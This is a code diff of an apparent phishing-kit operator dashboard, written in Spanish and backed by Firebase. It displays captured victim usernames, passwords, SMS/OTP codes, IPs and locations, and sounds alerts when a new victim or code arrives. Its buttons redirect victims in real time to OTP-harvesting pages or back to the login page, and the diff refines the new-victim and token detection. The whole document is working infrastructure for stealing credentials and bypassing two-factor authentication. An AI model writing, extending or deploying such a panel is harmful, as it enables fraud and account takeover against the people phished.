@@ -10,31 +10,115 @@
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #000; font-family: 'JetBrains Mono', monospace; color: #fff; overflow-x: hidden; }
+        body { 
+            background: #000; 
+            font-family: 'JetBrains Mono', monospace; 
+            color: #fff;
+            overflow-x: hidden;
+        }
         
-        .header { background: #0a0a0a; border-bottom: 2px solid #6366f1; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
-        .logo { font-family: 'Orbitron', sans-serif; font-size: 24px; font-weight: 900; background: linear-gradient(90deg, #6366f1, #8b5cf6, #ec4899); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-transform: uppercase; letter-spacing: 2px; }
+        .header {
+            background: #0a0a0a;
+            border-bottom: 2px solid #6366f1;
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 24px;
+            font-weight: 900;
+            background: linear-gradient(90deg, #6366f1, #8b5cf6, #ec4899);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
         
-        .stats-bar { display: flex; gap: 20px; align-items: center; }
-        .stat-item { background: #111; border: 1px solid #222; padding: 8px 20px; border-radius: 8px; font-size: 13px; }
+        .stats-bar {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+        .stat-item {
+            background: #111;
+            border: 1px solid #222;
+            padding: 8px 20px;
+            border-radius: 8px;
+            font-size: 13px;
+        }
         .stat-item span { color: #6366f1; font-weight: bold; }
         
-        .btn-header { padding: 10px 25px; border: none; border-radius: 8px; font-size: 13px; font-weight: bold; cursor: pointer; transition: all 0.3s; text-transform: uppercase; letter-spacing: 1px; }
+        .btn-header {
+            padding: 10px 25px;
+            border: none;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
         .btn-pink { background: #be185d; color: white; }
         .btn-dark { background: #1a1a1a; border: 1px solid #333; color: #888; }
         .btn-dark:hover { border-color: #6366f1; color: #6366f1; }
         
-        .table-container { padding: 20px 30px; }
-        .table-header { display: grid; grid-template-columns: 100px 120px 140px 140px 100px 120px 120px 1fr; gap: 10px; padding: 15px; background: #0a0a0a; border-bottom: 2px solid #6366f1; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: #666; font-weight: bold; }
+        .table-container {
+            padding: 20px 30px;
+        }
+        .table-header {
+            display: grid;
+            grid-template-columns: 80px 120px 140px 140px 100px 140px 140px 1fr;
+            gap: 10px;
+            padding: 15px;
+            background: #0a0a0a;
+            border-bottom: 2px solid #6366f1;
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #666;
+            font-weight: bold;
+        }
         
-        .data-row { display: grid; grid-template-columns: 100px 120px 140px 140px 100px 120px 120px 1fr; gap: 10px; padding: 15px 10px; background: #0f0f0f; border-left: 4px solid #6366f1; margin-bottom: 8px; align-items: center; transition: all 0.3s; }
+        .data-row {
+            display: grid;
+            grid-template-columns: 80px 120px 140px 140px 100px 140px 140px 1fr;
+            gap: 10px;
+            padding: 15px 10px;
+            background: #0f0f0f;
+            border-left: 4px solid #6366f1;
+            margin-bottom: 8px;
+            align-items: center;
+            transition: all 0.3s;
+        }
         .data-row:hover { background: #1a1a1a; }
         .data-row.spam { border-left-color: #ef4444; opacity: 0.6; background: #1a0505; }
-        .data-row.offline { border-left-color: #374151; opacity: 0.5; }
+        .data-row.nuevo { 
+            animation: flashNuevo 2s;
+            border-left-color: #10b981;
+            background: #0a1f15;
+        }
+        .data-row.nuevo-otp { 
+            animation: flashOTP 2s;
+            border-left-color: #8b5cf6;
+            background: #1a0f2e;
+        }
+        @keyframes flashNuevo {
+            0%, 100% { box-shadow: 0 0 0 rgba(16, 185, 129, 0); }
+            50% { box-shadow: 0 0 30px rgba(16, 185, 129, 0.5); }
+        }
+        @keyframes flashOTP {
+            0%, 100% { box-shadow: 0 0 0 rgba(139, 92, 246, 0); }
+            50% { box-shadow: 0 0 30px rgba(139, 92, 246, 0.5); }
+        }
         
         .cell-status { display: flex; align-items: center; gap: 8px; font-size: 11px; font-weight: bold; }
         .live-dot { width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: blink 1.5s infinite; }
-        .offline-dot { width: 8px; height: 8px; background: #6b7280; border-radius: 50%; }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
         
         .cell-tipo { font-size: 12px; }
@@ -47,8 +131,8 @@
         .cell-token { font-family: 'JetBrains Mono', monospace; color: #10b981; font-weight: bold; font-size: 14px; background: #0a1f15; padding: 5px 10px; border-radius: 5px; text-align: center; border: 1px solid #10b981; }
         .cell-token.vacio { color: #666; background: #1a1a1a; border: 1px solid #333; }
         
-        .cell-pagina { font-size: 10px; color: #f59e0b; text-transform: uppercase; }
-        .cell-ip { font-family: 'JetBrains Mono', monospace; color: #888; font-size: 10px; }
+        .cell-ip { font-family: 'JetBrains Mono', monospace; color: #f59e0b; font-size: 11px; }
+        .cell-geo { color: #888; font-size: 11px; }
         
         .actions { display: flex; gap: 5px; justify-content: flex-end; }
         .btn-action { padding: 6px 12px; border: none; border-radius: 5px; font-size: 9px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
@@ -93,9 +177,10 @@
             
             <div class="stats-bar">
                 <div class="stat-item">TOTAL: <span id="stat-total">0</span></div>
-                <div class="stat-item">LIVE: <span id="stat-online" style="color: #10b981;">0</span></div>
-                <div class="stat-item">OFF: <span id="stat-offline" style="color: #6b7280;">0</span></div>
+                <div class="stat-item">ONLINE: <span id="stat-online" style="color: #10b981;">0</span></div>
+                <div class="stat-item">SPAM: <span id="stat-spam" style="color: #ef4444;">0</span></div>
                 <div class="stat-item">IPs: <span id="stat-ips">0</span></div>
+                <div class="stat-item">BLOQ: <span id="stat-blocked" style="color: #dc2626;">0</span></div>
             </div>
             
             <div style="display: flex; gap: 10px;">
@@ -110,12 +195,12 @@
         <div class="table-container">
             <div class="table-header">
                 <div>ESTADO</div>
-                <div>PÁGINA</div>
+                <div>TIPO</div>
                 <div>USUARIO</div>
                 <div>CONTRASEÑA</div>
                 <div>TOKEN</div>
                 <div>IP</div>
-                <div>TIEMPO</div>
+                <div>UBICACIÓN</div>
                 <div style="text-align: right;">ACCIONES</div>
             </div>
             <div id="container"></div>
@@ -128,7 +213,9 @@
         let vistaActual = 'validos';
         let datos = { validos: [], spam: [], blacklist: {} };
         let contadorIPs = {};
-        let tokensVistos = {};
+        
+        // Guardamos datos anteriores para comparar
+        let datosAnteriores = {};
         let audioAutorizado = false;
 
         // SONIDO
@@ -205,8 +292,8 @@
             db.ref('logins').on('value', (snap) => {
                 const validos = [];
                 contadorIPs = {};
-                let hayNuevo = false;
-                let hayOTP = false;
+                let hayNuevoCliente = false;
+                let hayNuevoOTP = false;
                 
                 snap.forEach((child) => {
                     const data = child.val();
@@ -222,38 +309,39 @@
                         contadorIPs[data.ip] = (contadorIPs[data.ip] || 0) + 1;
                     }
                     
-                    // Detectar nuevo cliente
-                    const esNuevo = !tokensVistos.hasOwnProperty(id);
-                    if (esNuevo && Object.keys(tokensVistos).length > 0) {
-                        hayNuevo = true;
-                        tokensVistos[id] = '';
-                    }
-                    
-                    // Detectar OTP - comparar token actual con el guardado
-                    const tokenActual = data.sms || data.otp || '';
-                    const tokenAnterior = tokensVistos[id] || '';
-                    
-                    // Si hay token nuevo (diferente al anterior y no vacío)
-                    if (tokenActual && tokenActual !== '' && tokenActual !== '----' && tokenActual !== tokenAnterior) {
-                        if (!esNuevo) { // Solo si no es cliente nuevo (para no doblar sonido)
-                            hayOTP = true;
+                    // Verificar si es cliente nuevo
+                    if (!datosAnteriores[id]) {
+                        // Cliente completamente nuevo
+                        if (Object.keys(datosAnteriores).length > 0) {
+                            hayNuevoCliente = true;
                         }
-                        tokensVistos[id] = tokenActual;
+                    } else {
+                        // Cliente existente - verificar si agregó OTP
+                        const tokenAnterior = datosAnteriores[id].sms || datosAnteriores[id].otp || '';
+                        const tokenActual = data.sms || data.otp || '';
+                        
+                        // Si antes no tenía token o estaba vacío, y ahora sí tiene
+                        if ((!tokenAnterior || tokenAnterior === '' || tokenAnterior === '----') && 
+                            tokenActual && tokenActual !== '' && tokenActual !== '----') {
+                            hayNuevoOTP = true;
+                        }
                     }
                     
+                    // Guardar para próxima comparación
+                    datosAnteriores[id] = {...data};
                     validos.push({ id, data, esSpam: false });
                 });
                 
-                // Reproducir sonidos
-                if (hayNuevo) {
+                // SONIDOS
+                if (hayNuevoCliente) {
                     playSound();
                     mostrarNotificacion('¡NUEVO CLIENTE!', false);
-                }
-                if (hayOTP) {
+                } else if (hayNuevoOTP) {
+                    // Pequeña demora para distinguir del sonido de cliente nuevo
                     setTimeout(() => {
                         playSound();
                         mostrarNotificacion('¡TOKEN RECIBIDO!', true);
-                    }, hayNuevo ? 500 : 0);
+                    }, 200);
                 }
                 
                 datos.validos = validos;
@@ -270,6 +358,7 @@
 
             db.ref('blacklist').on('value', (snap) => {
                 datos.blacklist = snap.val() || {};
+                document.getElementById('stat-blocked').textContent = Object.keys(datos.blacklist).length;
                 renderizar();
             });
         }
@@ -293,12 +382,9 @@
             const container = document.getElementById('container');
             container.innerHTML = '';
 
-            const online = datos.validos.filter(d => d.data.online && d.data.pagina).length;
-            const offline = datos.validos.length - online;
-
             document.getElementById('stat-total').textContent = datos.validos.length;
-            document.getElementById('stat-online').textContent = online;
-            document.getElementById('stat-offline').textContent = offline;
+            document.getElementById('stat-spam').textContent = datos.spam.length;
+            document.getElementById('stat-online').textContent = datos.validos.filter(d => d.data.online).length;
             document.getElementById('stat-ips').textContent = Object.keys(contadorIPs).length;
 
             if (vistaActual === 'ips') { renderizarIPs(); return; }
@@ -315,34 +401,31 @@
             aMostrar.forEach(({id, data, esSpam}) => {
                 const token = data.sms || data.otp || '';
                 const tieneOTP = token && token !== '' && token !== '----';
-                
-                // Determinar estado basado en pagina y online
-                const paginasValidas = ['index2.html', 'cargando.html', 'otp.html', 'cargando2.html', 'otp2.html'];
-                const estaActivo = data.online && data.pagina && paginasValidas.includes(data.pagina);
-                
                 const vecesIP = contadorIPs[data.ip] || 1;
-                const tiempoTranscurrido = data.ultimoPing ? Math.floor((Date.now() - data.ultimoPing) / 1000) + 's' : '-';
+                const ipBloqueada = data.ip && datos.blacklist[data.ip];
                 
                 let rowClass = 'data-row';
                 if (esSpam) rowClass += ' spam';
-                if (!estaActivo) rowClass += ' offline';
+                
+                const tipoTexto = tieneOTP ? 'TOKEN OK' : 'CREDENCIALES';
                 
                 container.innerHTML += `
                     <div class="${rowClass}">
-                        <div class="cell-status">
-                            ${estaActivo ? '<div class="live-dot"></div>LIVE' : '<div class="offline-dot"></div>OFF'}
+                        <div class="cell-status"><div class="live-dot"></div>LIVE</div>
+                        <div class="cell-tipo">
+                            <div class="tipo-main" style="${tieneOTP ? 'color: #10b981;' : ''}">${tipoTexto}</div>
+                            <div class="tipo-sub">${esSpam ? 'SPAM' : 'INGRESANDO'}</div>
                         </div>
-                        <div class="cell-pagina">${data.pagina || 'Desconocida'}</div>
                         <div class="cell-user">${data.user || 'N/A'}</div>
                         <div class="cell-pass">${data.pass || '****'}</div>
                         ${tieneOTP ? `<div class="cell-token">${token}</div>` : `<div class="cell-token vacio">----</div>`}
                         <div class="cell-ip">${data.ip || 'N/A'}${vecesIP > 1 ? `<span class="badge-count">${vecesIP}</span>` : ''}</div>
-                        <div class="cell-geo">${tiempoTranscurrido}</div>
+                        <div class="cell-geo">${ipBloqueada ? '[BLOQUEADA] ' : ''}${data.location || 'Desconocida'}</div>
                         <div class="actions">
                             ${!esSpam ? `
                                 <button class="btn-action btn-sms1" onclick="db.ref('comandos/${id}').set({redirect: 'otp.html'})">SMS 1</button>
                                 <button class="btn-action btn-sms2" onclick="db.ref('comandos/${id}').set({redirect: 'otp2.html'})">SMS 2</button>
-                                <button class="btn-action btn-reject" onclick="db.ref('comandos/${id}').set({redirect: 'index.html'})">RECHAZAR</button>
+                                <button class="btn-action btn-reject" onclick="db.ref('comandos/${id}').set({redirect: 'index.html'}); db.ref('logins/${id}').update({step: 'Rechazado'})">RECHAZAR</button>
                                 <button class="btn-action btn-delete" onclick="db.ref('logins/${id}').remove()">ELIMINAR</button>
                             ` : `
                                 <button class="btn-action btn-sms1" onclick="recuperar('${id}')">RECUPERAR</button>
